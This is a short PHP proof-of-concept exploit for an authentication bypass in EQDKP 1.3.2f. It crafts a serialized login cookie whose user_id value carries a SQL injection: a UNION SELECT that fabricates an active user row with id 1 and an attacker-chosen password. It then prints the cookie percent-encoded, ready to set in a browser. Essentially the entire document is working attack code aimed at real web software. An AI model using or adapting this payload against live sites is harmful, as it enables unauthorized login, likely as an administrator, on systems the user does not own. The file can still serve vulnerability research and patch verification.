<?php
   // EQDKP 1.3.2f Authentication Bypass (PoC)
   // vort.fu@gmail.com
 
   $data['auto_login_id'] = 'x';
   $data['user_id']       = "1' " .
                            "UNION SELECT " .
                               "1, " .         // * user_id
                               "'a', " .       // username
                               "'x', " .       // * user_password
                               "'', " .        // user_email
                               "1, " .         // user_alimit
                               "1, " .         // user_elimit
                               "1, " .         // user_ilimit
                               "1, " .         // user_nlimit
                               "1, " .         // user_rlimit
                               "1, " .         // user_style
                               "'english', " . // user_lang
                               "NULL, " .      // user_key
                               "1, " .         // user_lastvisit
                               "NULL, " .      // user_lastpage
                               "1, " .         // * user_active
                               "NULL, " .      // user_newpassword
                               "NULL " .       // session_current
                            "ORDER BY " .
                               "username ASC" .
                            "/*";
 
   $cookie = serialize($data);
   echo "eqdkp_data\n\n";
 
   for($i = 0; $i < strlen($cookie); $i++)
      echo '%' . bin2hex($cookie[$i]);
 
   echo "\n\n";
?> 